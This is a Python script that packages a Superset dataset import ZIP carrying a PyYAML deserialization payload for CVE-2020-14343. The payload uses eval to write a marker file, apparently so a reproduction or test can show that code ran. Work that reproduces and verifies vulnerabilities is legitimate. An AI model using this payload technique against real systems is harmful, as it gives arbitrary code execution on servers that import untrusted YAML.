#!/usr/bin/env python3
"""Build the isolated authored-v1 payload in Superset's existing ZIP layout."""

from __future__ import annotations

import sys
from zipfile import ZIP_DEFLATED, ZipFile


MARKER_PATH = "/tmp/TRIGGER_CVE-2020-14343"

METADATA = """\
version: 1.0.0
type: Dataset
timestamp: '2020-11-04T21:27:44.423819+00:00'
"""

AUTHORED_V1_DATASET = """\
!!python/object/new:tuple
- !!python/object/new:map
  - !!python/name:eval
  - ["__import__('builtins').open('/tmp/TRIGGER_CVE-2020-14343','w').write('1')"]
"""


def main(output_path: str) -> None:
    with ZipFile(output_path, "w", ZIP_DEFLATED) as bundle:
        bundle.writestr("export/metadata.yaml", METADATA)
        bundle.writestr("export/datasets/authored-v1.yaml", AUTHORED_V1_DATASET)


if __name__ == "__main__":
    main(sys.argv[1])
